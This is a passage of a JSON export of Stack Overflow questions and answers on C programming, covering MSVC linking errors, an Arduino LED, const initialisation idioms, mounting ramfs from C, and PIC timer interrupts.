<code>cl</code>) from the command line, I get strange errors. I can create <code>.obj</code> objects just fine, but linking produces errors like the following:</p>\n\n<blockquote>\n  <p>link /DEFAULTLIB:libcmt /VERBOSE hello.obj</p>\n</blockquote>\n\n<pre><code>Microsoft (R) Incremental Linker Version 12.00.31101.0\nCopyright (C) Microsoft Corporation.  All rights reserved.\n\n\nStarting pass 1\n\nSearching libraries\n    Searching C:\\Program Files (x86)\\Microsoft Visual Studio 12.0\\VC\\LIB\\libcmt.lib:\n\nFinished searching libraries\n\nFinished pass 1\n\n\nUnused libraries:\n  C:\\Program Files (x86)\\Microsoft Visual Studio 12.0\\VC\\LIB\\libcmt.lib\n\nhello.obj : error LNK2019: unresolved external symbol printf referenced in function main\nLINK : error LNK2001: unresolved external symbol mainCRTStartup\nhello.exe : fatal error LNK1120: 2 unresolved externals\n</code></pre>\n\n<p>For some reason, it is ignoring the specified library and is unable to locate the relevant libraries for linking. How can I get the linker to resolve the symbols properly?</p>\n"}, {"tags": ["c", "arduino", "embedded", "arduino-ide"], "answers": [{"comments": [{"owner": {"reputation": 1548, "user_id": 3082873, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wT9Nk.jpg?s=128&g=1", "display_name": "cagdas", "link": "https://stackoverflow.com/users/3082873/cagdas"}, "edited": false, "score": 0, "creation_date": 1476255542, "post_id": 39991979, "comment_id": 67262629, "body": "Also put prints into switch case statements to see if you have any problems in serial read."}, {"owner": {"reputation": 46684, "user_id": 1527, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2180b1a962bf46e58fa9746cb4ebfb91?s=128&d=identicon&r=PG", "display_name": "Pete Kirkham", "link": "https://stackoverflow.com/users/1527/pete-kirkham"}, "edited": false, "score": 0, "creation_date": 1476272025, "post_id": 39991979, "comment_id": 67272829, "body": "After reset the outputs are tristate and when set to output default to low so adding extra code to setup is not required. Presumably the first time round the loop it reads from analog 0 and gets a value greater than 800, then following the change to read from analog 1 (due to <code>ANALOG = HIGH</code> error, HIGH being 1 ) it no longer gets a value greater than 800, so the next question is why is the value &gt; 800 - maybe sensor output is inverted?"}, {"owner": {"reputation": 1548, "user_id": 3082873, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wT9Nk.jpg?s=128&g=1", "display_name": "cagdas", "link": "https://stackoverflow.com/users/3082873/cagdas"}, "reply_to_user": {"reputation": 46684, "user_id": 1527, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2180b1a962bf46e58fa9746cb4ebfb91?s=128&d=identicon&r=PG", "display_name": "Pete Kirkham", "link": "https://stackoverflow.com/users/1527/pete-kirkham"}, "edited": false, "score": 0, "creation_date": 1476272202, "post_id": 39991979, "comment_id": 67272939, "body": "@PeteKirkham yes, as you say analog read possibly gets 5v so assigned as 1024. So I&#39;d make user to put extra debug lines into switch statements."}], "tags": [], "owner": {"reputation": 1548, "user_id": 3082873, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wT9Nk.jpg?s=128&g=1", "display_name": "cagdas", "link": "https://stackoverflow.com/users/3082873/cagdas"}, "is_accepted": false, "score": 0, "last_activity_date": 1476254219, "creation_date": 1476254219, "answer_id": 39991979, "question_id": 39991850, "link": "https://stackoverflow.com/questions/39991850/how-to-set-the-led-to-turn-off-from-the-start-arduino/39991979#39991979", "title": "How to set the LED to turn off from the start (Arduino)", "body": "<p>Put the line at the end of the setup():</p>\n\n<pre><code>digitalWrite(PROX_SENSOR_LED, LOW);\n</code></pre>\n\n<p>Also <code>if (ANALOG = HIGH)</code> is a wrong statement and you assign HIGH to your ANALOG. Change it as <code>if (ANALOG == HIGH)</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "is_accepted": false, "score": 0, "last_activity_date": 1476263755, "creation_date": 1476263755, "answer_id": 39994883, "question_id": 39991850, "link": "https://stackoverflow.com/questions/39991850/how-to-set-the-led-to-turn-off-from-the-start-arduino/39994883#39994883", "title": "How to set the LED to turn off from the start (Arduino)", "body": "<p>All GPIO will start-up in the high impedance input state so that the control to the LED is floating - the state of the LED in that case will depend on the LED drive circuit and whether it has a pull-up or pull-down resistor.  That is to say it is a <em>hardware problem</em> not a software problem.</p>\n\n<p>During <em>upload</em> the Arduino bootloader is running and it does not initialise any I/O that is not needed for the upload process. If you cannot fix the hardware design so that it floats to the off state, then you would need to <a href=\"https://www.arduino.cc/en/Hacking/Bootloader?from=Tutorial.Bootloader\" rel=\"nofollow\">modify the bootloader</a> in order to turn the LED off at the earliest opportunity - (there will still be a glitch that may or may not be visible). That is probably a bad idea, because then you have an application specific bootloader rather than a generic one, and for other applications setting this I/O pin may be entirely undesirable. </p>\n\n<p>That said, it is not entirely clear why it is a problem that the LED is on during upload, and simply initialising the output in the <code>setup()</code> would seem acceptable in most cases.</p>\n"}], "owner": {"reputation": 29, "user_id": 6876625, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-z59nCdzDbl8/AAAAAAAAAAI/AAAAAAAAAEk/sWajKG6wdL0/photo.jpg?sz=128", "display_name": "xleMnlx", "link": "https://stackoverflow.com/users/6876625/xlemnlx"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1528, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1476263755, "creation_date": 1476253724, "last_edit_date": 1476257693, "question_id": 39991850, "link": "https://stackoverflow.com/questions/39991850/how-to-set-the-led-to-turn-off-from-the-start-arduino", "title": "How to set the LED to turn off from the start (Arduino)", "body": "<p>so am... I 'am new to Arduino and I'm currently trying to make this work.. but I'm already doing this for an hour with luck not in my side...\nHere is the summary of what I'm doing: I have a Gizduino + 644 (a copy of Arduino with ATmega 644 here in Phil.), a IR Proximity Sensor (3 PIN - VCC, GRND, OUT), 2 LED's (Red and Yellow) and 2 100ohms Resistor. </p>\n\n<p>So far, this is what I can do:</p>\n\n<ul>\n<li>In Arduino IDE, I have a case in which if I type 'QRIN' - the Proximity and the Red LED will turn on... if the proximity sense something within its range.. the Yellow LED will turn ON. If I type 'QROUT' - the Proximity will immediately turn off and the Red LED will turn on for 10 seconds and will turn off..</li>\n</ul>\n\n<p>And this is the problem:</p>\n\n<ul>\n<li>The Yellow LED always turns ON if it's the first run(I mean I just click the upload button in IDE).... and that's a very big problem... it will only turn off if I type the cases: 'QRIN' and 'QROUT'..</li>\n</ul>\n\n<p>In my code, the names are the following: </p>\n\n<ul>\n<li>Red LED - LOCK </li>\n<li>Yellow LED - PROX_SENSOR_LED </li>\n<li>Proximity - PROX</li>\n</ul>\n\n<p>This is my code in IDE:</p>\n\n<pre><code>int LOCK = 13; //RED LED, in pin 13\nint PROX = 12; //PROXIMITY, in pin 12\nint ANALOG = 0; //OUT of Proximity,  in Analog 0\nint PROX_SENSOR_LED = 7; //Yellow LED, in pin 7\nint val = 0;  //value to store\n\nvoid setup()\n{\n  Serial.begin(9600);\n  pinMode(LOCK, OUTPUT); //set the pin # as output (VCC of the hardware)\n  pinMode(PROX, OUTPUT); //set the pin # as output (VCC of the hardware)\n  pinMode(PROX_SENSOR_LED, OUTPUT); //set the pin # as output (VCC of the hardware)\n}\n\nvoid loop()\n{\n  digitalWrite(PROX_SENSOR_LED, LOW); //sets the output pin initially to LOW (but doesnt work.. T_T)\n  val = analogRead(ANALOG);  //read the input pin 0 to 1023\n  if (val &gt; 800)    //if the sensor value is higher threshold set OUTPUT HIGH\n  {\n    digitalWrite(PROX_SENSOR_LED, HIGH);  //sets output pin HIGH\n    delay(100);    //waits for .1 second\n  }\n\n  char data = Serial.read(); //read 9600\n\n  switch (data) //start of case... like 'ON' 'OFF'\n  {\n    case 'QRIN': //this is my 'ON'\n                digitalWrite(PROX, HIGH); //turn the proximity to ON\n                digitalWrite(LOCK, HIGH); //turn the lock to ON\n                break;\n    case 'QROUT': //this is my off 'OFF'\n                digitalWrite(PROX, LOW); //turn the proximity to OFF\n                digitalWrite(LOCK, HIGH); //turn the lock to ON\n                delay(10000);              //for 10 seconds\n                digitalWrite(LOCK, LOW);   //then off\n                if (ANALOG = HIGH)  // I need this 'if' condition because if\n                {    //this is not here... the Yellow LED is turn ON... \n                  digitalWrite(PROX_SENSOR_LED, LOW); //I don't know why.. T_T\n                }\n                break;\n  }\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 6779, "user_id": 1691223, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/c2AsP.jpg?s=128&g=1", "display_name": "Shravan40", "link": "https://stackoverflow.com/users/1691223/shravan40"}, "edited": false, "score": 0, "creation_date": 1476253508, "post_id": 39991700, "comment_id": 67261653, "body": "You can use <code>const_cast</code>."}, {"owner": {"reputation": 126541, "user_id": 153285, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/1UiET.jpg?s=128&g=1", "display_name": "Potatoswatter", "link": "https://stackoverflow.com/users/153285/potatoswatter"}, "reply_to_user": {"reputation": 6779, "user_id": 1691223, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/c2AsP.jpg?s=128&g=1", "display_name": "Shravan40", "link": "https://stackoverflow.com/users/1691223/shravan40"}, "edited": false, "score": 3, "creation_date": 1476253763, "post_id": 39991700, "comment_id": 67261772, "body": "@Shravan40 Use <code>static_cast</code> to add <code>const</code>. Only use <code>const_cast</code> to <i>remove</i> it, because it&#39;s a red flag."}, {"owner": {"reputation": 32126, "user_id": 2666289, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/746dd23bbe20769fbd758421e67f455c?s=128&d=identicon&r=PG", "display_name": "Holt", "link": "https://stackoverflow.com/users/2666289/holt"}, "edited": false, "score": 7, "creation_date": 1476254051, "post_id": 39991700, "comment_id": 67261885, "body": "You should tag C or C++, not both, some answers here cannot be applied to C."}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 4, "creation_date": 1476254150, "post_id": 39991700, "comment_id": 67261924, "body": "I think that using 2 versions of a same local variable sounds like over engineering. If you have hard time tracking if you should assign to variable or not, your function is probably too big."}, {"owner": {"reputation": 2512, "user_id": 683727, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/a6afa301295775f882aea1c37da9aee3?s=128&d=identicon&r=PG&f=1", "display_name": "wuxb", "link": "https://stackoverflow.com/users/683727/wuxb"}, "edited": false, "score": 0, "creation_date": 1476289451, "post_id": 39991700, "comment_id": 67285110, "body": "My bad. It was for C. Since the answers all go to C++, let it be..."}], "answers": [{"tags": [], "owner": {"reputation": 863, "user_id": 5308925, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6d024faf033f34efd7d35cdd62e1f464?s=128&d=identicon&r=PG&f=1", "display_name": "nsubiron", "link": "https://stackoverflow.com/users/5308925/nsubiron"}, "is_accepted": true, "score": 9, "last_activity_date": 1476253458, "creation_date": 1476253458, "answer_id": 39991791, "question_id": 39991700, "link": "https://stackoverflow.com/questions/39991700/is-there-a-better-way-to-cast-a-variable-to-const-after-assignments/39991791#39991791", "title": "Is there a better way to cast a variable to &#39;const&#39; after assignments?", "body": "<p>Consider making a function that returns the value you want</p>\n\n<pre><code>const int flags = getFlags();\n</code></pre>\n\n<p>Or more object oriented make a flags class that does that in the constructor.</p>\n\n<pre><code>const Flags flags(condition1, ...);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 144568, "user_id": 3309790, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/7d1c7e499132b9945b412ac79d0e22f7?s=128&d=identicon&r=PG&f=1", "display_name": "songyuanyao", "link": "https://stackoverflow.com/users/3309790/songyuanyao"}, "is_accepted": false, "score": 2, "last_activity_date": 1476253511, "creation_date": 1476253511, "answer_id": 39991804, "question_id": 39991700, "link": "https://stackoverflow.com/questions/39991700/is-there-a-better-way-to-cast-a-variable-to-const-after-assignments/39991804#39991804", "title": "Is there a better way to cast a variable to &#39;const&#39; after assignments?", "body": "<p>IMO it's a coding style issue.</p>\n\n<pre><code>int get_flags() {\n  int flags;\n  ....\n  if (condition1) \n      flags |= 1;\n  ....\n  if (conditionX)\n      flags |= Y;\n  ....\n  return flags;\n}\nvoid foo() {\n  const int flags = get_flags();\n  ....\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 2512, "user_id": 683727, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/a6afa301295775f882aea1c37da9aee3?s=128&d=identicon&r=PG&f=1", "display_name": "wuxb", "link": "https://stackoverflow.com/users/683727/wuxb"}, "edited": false, "score": 0, "creation_date": 1476289320, "post_id": 39991842, "comment_id": 67285031, "body": "I like this. Note that this solution is only for C++."}, {"owner": {"reputation": 126541, "user_id": 153285, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/1UiET.jpg?s=128&g=1", "display_name": "Potatoswatter", "link": "https://stackoverflow.com/users/153285/potatoswatter"}, "reply_to_user": {"reputation": 2512, "user_id": 683727, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/a6afa301295775f882aea1c37da9aee3?s=128&d=identicon&r=PG&f=1", "display_name": "wuxb", "link": "https://stackoverflow.com/users/683727/wuxb"}, "edited": false, "score": 1, "creation_date": 1476328159, "post_id": 39991842, "comment_id": 67301161, "body": "@Nybble If you&#39;re unconcerned with portability, GCC and Clang offer <a href=\"https://gcc.gnu.org/onlinedocs/gcc/Statement-Exprs.html\" rel=\"nofollow noreferrer\">statement expressions</a> which work similarly in this case."}, {"owner": {"reputation": 2512, "user_id": 683727, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/a6afa301295775f882aea1c37da9aee3?s=128&d=identicon&r=PG&f=1", "display_name": "wuxb", "link": "https://stackoverflow.com/users/683727/wuxb"}, "edited": false, "score": 0, "creation_date": 1476332523, "post_id": 39991842, "comment_id": 67302226, "body": "Thanks a lot. Statement Expression is exactly what I need."}], "tags": [], "owner": {"reputation": 126541, "user_id": 153285, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/1UiET.jpg?s=128&g=1", "display_name": "Potatoswatter", "link": "https://stackoverflow.com/users/153285/potatoswatter"}, "is_accepted": false, "score": 9, "last_activity_date": 1476635306, "last_edit_date": 1476635306, "creation_date": 1476253713, "answer_id": 39991842, "question_id": 39991700, "link": "https://stackoverflow.com/questions/39991700/is-there-a-better-way-to-cast-a-variable-to-const-after-assignments/39991842#39991842", "title": "Is there a better way to cast a variable to &#39;const&#39; after assignments?", "body": "<p>In C++, you can initialize the variable by calling a lambda expression:</p>\n\n<pre><code>const int flags = [&amp;] {\n    int flags = 0;\n\n    if (condition1) \n        flags |= 1;\n    ....\n    if (conditionX)\n        flags |= Y;\n\n    return flags;\n}();\n</code></pre>\n\n<p>In either language, GCC and Clang (and other GCC-compatible compilers) have a similar feature as an <a href=\"https://gcc.gnu.org/onlinedocs/gcc/Statement-Exprs.html\" rel=\"nofollow\">extension</a>:</p>\n\n<pre><code>const int flags = ({\n    int flags = 0;\n\n    if (condition1) \n        flags |= 1;\n    ....\n    if (conditionX)\n        flags |= Y;\n\n    flags;\n});\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 5576, "user_id": 1794345, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/ILvFk.jpg?s=128&g=1", "display_name": "Rerito", "link": "https://stackoverflow.com/users/1794345/rerito"}, "is_accepted": false, "score": 3, "last_activity_date": 1476253815, "creation_date": 1476253815, "answer_id": 39991876, "question_id": 39991700, "link": "https://stackoverflow.com/questions/39991700/is-there-a-better-way-to-cast-a-variable-to-const-after-assignments/39991876#39991876", "title": "Is there a better way to cast a variable to &#39;const&#39; after assignments?", "body": "<p>You could just delegate the initialization of your variable to a function and assign its return value to the <code>const</code> version you need. For instance:</p>\n\n<pre><code>int bar() {\n    int flags = 0;\n    if (condition1) {\n        flags |= 1;\n    }\n    // ...\n    return flags;\n}\n\nvoid foo() {\n    int const c_flags = bar();\n    // ...\n}\n</code></pre>\n\n<p>That assumes that you can embed <code>condition1</code>, ..., <code>conditionX</code> into <code>bar</code>. If not you could always use functors (lambdas) to test your predicates and update <code>flags</code> accordingly.</p>\n"}, {"tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": false, "score": 0, "last_activity_date": 1476255149, "creation_date": 1476255149, "answer_id": 39992226, "question_id": 39991700, "link": "https://stackoverflow.com/questions/39991700/is-there-a-better-way-to-cast-a-variable-to-const-after-assignments/39992226#39992226", "title": "Is there a better way to cast a variable to &#39;const&#39; after assignments?", "body": "<p>This sounds like a non-issue... but should it be an actual problem, then proper program design can easily solve it:</p>\n\n<pre><code>void foo() {\n  int flags;\n\n  flags = do_stuff_with(flags);\n\n  take_decisions_based_on(flags);\n}\n</code></pre>\n\n<p>where the functions would be something like:</p>\n\n<pre><code>int do_stuff_with (int something);\n\nvoid take_decisions_based_on (int something);\n</code></pre>\n\n<p>You don't even need to apply const correctness since the functions will only be dealing with local copies of the variable.</p>\n"}, {"tags": [], "owner": {"reputation": 1934, "user_id": 4932834, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cb44dcd4ebddfea3ede8c6d46b02795?s=128&d=identicon&r=PG&f=1", "display_name": "PcAF", "link": "https://stackoverflow.com/users/4932834/pcaf"}, "is_accepted": false, "score": 0, "last_activity_date": 1476260157, "creation_date": 1476260157, "answer_id": 39993699, "question_id": 39991700, "link": "https://stackoverflow.com/questions/39991700/is-there-a-better-way-to-cast-a-variable-to-const-after-assignments/39993699#39993699", "title": "Is there a better way to cast a variable to &#39;const&#39; after assignments?", "body": "<p>What about using ternary operator:</p>\n\n<pre><code>const int flags = condition1 ? 1 : (condition2 ? 2 : (conditionX ? Y : default_value))\n</code></pre>\n"}], "owner": {"reputation": 2512, "user_id": 683727, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/a6afa301295775f882aea1c37da9aee3?s=128&d=identicon&r=PG&f=1", "display_name": "wuxb", "link": "https://stackoverflow.com/users/683727/wuxb"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 138, "favorite_count": 0, "accepted_answer_id": 39991791, "answer_count": 6, "score": 3, "last_activity_date": 1571423012, "creation_date": 1476253111, "last_edit_date": 1571423012, "question_id": 39991700, "link": "https://stackoverflow.com/questions/39991700/is-there-a-better-way-to-cast-a-variable-to-const-after-assignments", "title": "Is there a better way to cast a variable to &#39;const&#39; after assignments?", "body": "<p>I always use <code>const</code> to guard values that should not be assigned. Anyway, there are some cases that I may need to initialize a variable and then use it as a <code>const</code> value, in the same function. For example:</p>\n\n<pre><code>void foo() {\n  int flags;\n  /* ... */\n  if (condition1) \n      flags |= 1;\n  /* .... */\n  if (conditionX)\n      flags |= Y;\n  /* .... */\n  // start using flags as a const value\n  const flags; // &lt;&lt;= I want something like this.\n  const int c_flags = flags; // &lt;&lt;= What I have to do. The naming is annoying.\n  /* ... */\n}\n</code></pre>\n\n<p>Is there any way to improve this? Could be coding styles or advanced language features.</p>\n\n<hr>\n\n<p>From @Potatoswatter: for C in gcc/clang (gnu style, say, -std=gnu11), Statement Expression can be used.</p>\n\n<pre><code>foo() {\n  const int flags = ({\n    int f = 0;\n    if (X) f |= Y;\n    /* ... update f ... */\n    f;\n  });\n  /* use the `const` flags */\n}\n</code></pre>\n"}, {"tags": ["c", "linux", "unix"], "comments": [{"owner": {"reputation": 22505, "user_id": 1411457, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/XqssD.png?s=128&g=1", "display_name": "harmic", "link": "https://stackoverflow.com/users/1411457/harmic"}, "edited": false, "score": 0, "creation_date": 1476255661, "post_id": 39991618, "comment_id": 67262686, "body": "Sorry, I don&#39;t understand the question. In the code you supplied the only call to <code>system()</code> is commented out. Are you having problems getting it to work without <code>system()</code>? Is the call to <code>mount()</code> failing?"}, {"owner": {"reputation": 869, "user_id": 887420, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/WHuOw.jpg?s=128&g=1", "display_name": "Ilian Zapryanov", "link": "https://stackoverflow.com/users/887420/ilian-zapryanov"}, "reply_to_user": {"reputation": 22505, "user_id": 1411457, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/XqssD.png?s=128&g=1", "display_name": "harmic", "link": "https://stackoverflow.com/users/1411457/harmic"}, "edited": false, "score": 0, "creation_date": 1476260669, "post_id": 39991618, "comment_id": 67265560, "body": "Yes, I want to replace the system call with my C function. My C function options are probably incorrect."}, {"owner": {"reputation": 22505, "user_id": 1411457, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/XqssD.png?s=128&g=1", "display_name": "harmic", "link": "https://stackoverflow.com/users/1411457/harmic"}, "edited": false, "score": 0, "creation_date": 1476263753, "post_id": 39991618, "comment_id": 67267506, "body": "Use perror to print the error you get when it fails. <a href=\"http://en.cppreference.com/w/cpp/io/c/perror\" rel=\"nofollow noreferrer\">en.cppreference.com/w/cpp/io/c/perror</a>"}, {"owner": {"reputation": 869, "user_id": 887420, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/WHuOw.jpg?s=128&g=1", "display_name": "Ilian Zapryanov", "link": "https://stackoverflow.com/users/887420/ilian-zapryanov"}, "reply_to_user": {"reputation": 22505, "user_id": 1411457, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/XqssD.png?s=128&g=1", "display_name": "harmic", "link": "https://stackoverflow.com/users/1411457/harmic"}, "edited": false, "score": 0, "creation_date": 1476277096, "post_id": 39991618, "comment_id": 67276101, "body": "Will do that later and will report the message."}, {"owner": {"reputation": 7668, "user_id": 2554472, "user_type": "registered", "profile_image": "https://graph.facebook.com/1119155584/picture?type=large", "display_name": "Mark Plotnick", "link": "https://stackoverflow.com/users/2554472/mark-plotnick"}, "edited": false, "score": 1, "creation_date": 1476298357, "post_id": 39991618, "comment_id": 67290446, "body": "Your first 2 args to <code>mount</code> are swapped. The first should be <code>&quot;ramfs&quot;</code> (it can actually be any string at all when you&#39;re mounting a ramfs), and the second should be the mount point pathname. <code>mount_filesystem</code> has sensible names for its arguments, so I think what needs to be changed is the call to it: try <code>mount_filesystem(&quot;ramfs&quot;, pwd, &quot;ramfs&quot;, 0, &quot;rw&quot;, 0);</code>"}, {"owner": {"reputation": 869, "user_id": 887420, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/WHuOw.jpg?s=128&g=1", "display_name": "Ilian Zapryanov", "link": "https://stackoverflow.com/users/887420/ilian-zapryanov"}, "reply_to_user": {"reputation": 7668, "user_id": 2554472, "user_type": "registered", "profile_image": "https://graph.facebook.com/1119155584/picture?type=large", "display_name": "Mark Plotnick", "link": "https://stackoverflow.com/users/2554472/mark-plotnick"}, "edited": false, "score": 0, "creation_date": 1476327124, "post_id": 39991618, "comment_id": 67300914, "body": "@MarkPlotnick thank you, that did it. I missused my own function, silly me."}], "owner": {"reputation": 869, "user_id": 887420, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/WHuOw.jpg?s=128&g=1", "display_name": "Ilian Zapryanov", "link": "https://stackoverflow.com/users/887420/ilian-zapryanov"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 119, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1476252698, "creation_date": 1476252698, "question_id": 39991618, "link": "https://stackoverflow.com/questions/39991618/ramfs-mounting-program", "title": "RAMFS mounting program", "body": "<p>I rewrote a bash script into a standalone C program for mounting the current directory into the ramfs. However I still use \"system()\" for some of the functions. The only thing that still bothers me is the use of C mount function. In my code I call it with a system call but I want to know what is the right use in my case for C`s system.</p>\n\n<pre><code>    int main(int argc, char* argv[])\n    {\n    (void) argc; // unused\n\n    bool matched_result = false;\n\n    // extra size\n     char pwd[512]={0};\n     getcwd(pwd, sizeof(pwd)/sizeof(pwd[0]));\n\n     printf(\"Current working dir is: %s\\n\", pwd);\n\n    // Check is already mounted ramfs on the current directory.\n    // The beter way is manual parsing.\n    // in order to avoid that process we have to write dirwalker\n    // to list all mounted fses but for now will use this one\n    FILE* mntstatus = popen(\"mount\", \"r\");\n\n    // assume no more than 512 chars per line\n    char buff[512]={0};\n\n    while (fgets(buff, 512, mntstatus) != NULL) {\n        char* match = strchr(buff, '/');\n        // trim 3 whitespaces from the end\n        trim_end(match, ' ', 3);\n        if (strcmp(match, pwd)==0) {\n            printf(\"Match: [%s]\\n\", match);\n            matched_result = true;\n            break; // no need to search more\n        }\n    }\n\n    // our cwd is not mounted\n    if (!matched_result) {\n        // empty, ok we can mount here\n        // just efective-uid is not enough for mount\n        // i need real-uid\n        setuid(0);\n\n        int res = mount_filesystem(pwd, \"ramfs\", \"ramfs\", 0, \"rw\", 0);\n        //int res = system(\"mount -t ramfs ramfs `pwd`\");\n        if (res == 0) {\n            printf(\"Mount ok\\n\");\n            // convert to octals\n            int octal_perms = strtol(g_Permissions, 0, 8);\n            if (chmod(pwd, octal_perms) &lt; 0) {\n                fprintf(stderr, \"%s: error in chmod(%s, %s) - %d (%s)\\n\",\n                        argv[0], // program\n                        pwd,    // current dir\n                        g_Permissions, // with permissions\n                        errno,          // Ermac :)\n                        strerror(errno));\n                exit(1);\n            }\n\n        } else {\n            printf(\"Mount failed!\\n\");\n            return 1;\n        }\n    } else {\n        printf(\"Dude you are ok!\\n\");\n    }\n\n    return 0;\n    }\n\n\n     void trim_end(char *str, const char delim, int count)\n     {\n     char* begin = str;\n     char* end = &amp;str[strlen(str)-1];\n    int i=0;\n    while ((i &lt; count) &amp;&amp; ( begin != end)) {\n        if (*end == delim) {\n            i++;\n        }\n        *end-- = 0;\n    }\n}\n\n\nvoid register_exit_callback(cbAtExit ex)\n{\n    atexit(ex);\n}\n\nint mount_filesystem(const char *src, const char *tgt, const char *fstype, unsigned long flags,\n                     const char *mode, const char *uid)\n{\n    char mode_uid[256]={0};\n    if((mode != NULL) &amp;&amp; (uid != NULL)) {\n        sprintf(mode_uid, \"mode=%s,uid=%s\", mode, uid);\n    }\n\n    int result = mount(src, tgt, fstype, flags, mode_uid);\n    // handle result outside\n    return result;\n}\n</code></pre>\n"}, {"tags": ["c", "timer", "interrupt"], "answers": [{"tags": [], "owner": {"reputation": 8430, "user_id": 3555525, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3ba5dbe6c89022c8af714c8d841f9547?s=128&d=identicon&r=PG&f=1", "display_name": "Rishikesh Raje", "link": "https://stackoverflow.com/users/3555525/rishikesh-raje"}, "is_accepted": false, "score": 0, "last_activity_date": 1476253313, "creation_date": 1476253313, "answer_id": 39991757, "question_id": 39991482, "link": "https://stackoverflow.com/questions/39991482/interrupt-c-timers/39991757#39991757", "title": "interrupt C timers", "body": "<p>You should also toggle the bits at every timer end. The order that you are toggling is wrong. At every timer finish, you are toggling BIT10 twice, i.e. getting it back to initial position.</p>\n\n<p>You can use code like this.</p>\n\n<pre><code>count = 0;  // in Init.\nwhile(1)\n{\n    if (IFS0bits.T2IF == 1)\n    {\n        //if timer == period, toggle the LED\n        count++;\n        PORTToggleBits(IOPORT_B, BIT_10);\n        if (count %2 == 0)\n        {\n          DelayMs(2);\n          PORTToggleBits(IOPORT_B, BIT_11);\n        }\n        if (count &gt; 3)\n           count = 0;\n        mT2ClearIntFlag();\n    }\n }\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 147, "user_id": 6897611, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/50e0b65453516d1cdc4d82a3c3632d7e?s=128&d=identicon&r=PG&f=1", "display_name": "grml", "link": "https://stackoverflow.com/users/6897611/grml"}, "is_accepted": false, "score": 0, "last_activity_date": 1476253538, "creation_date": 1476253538, "answer_id": 39991813, "question_id": 39991482, "link": "https://stackoverflow.com/questions/39991482/interrupt-c-timers/39991813#39991813", "title": "interrupt C timers", "body": "<p>You are toggleing the Bit 10 with a delay of 2 ms to it's first state. Even if this works, you will not notice.</p>\n"}], "owner": {"reputation": 11, "user_id": 6824649, "user_type": "registered", "accept_rate": 20, "profile_image": "https://graph.facebook.com/10207073044037952/picture?type=large", "display_name": "Jeremiah", "link": "https://stackoverflow.com/users/6824649/jeremiah"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 3431, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1477697492, "creation_date": 1476252147, "last_edit_date": 1477697492, "question_id": 39991482, "link": "https://stackoverflow.com/questions/39991482/interrupt-c-timers", "title": "interrupt C timers", "body": "<p>There seems to be a conflict between timer 2 and timer 3. This is a MIPS board and instead of using assembly language to program; I am using C. Timer1 is for a count which works properly. Timer2 is for a blinking LED which works properly. Timer3 is for switching count directions. But there is a conflict between timer2 and timer3. Does anyone know where the conflict is? I have to comment out DelayInit3(); in order for the code to execute properly.</p>\n\n<pre><code>void __ISR(_TIMER_2_VECTOR, 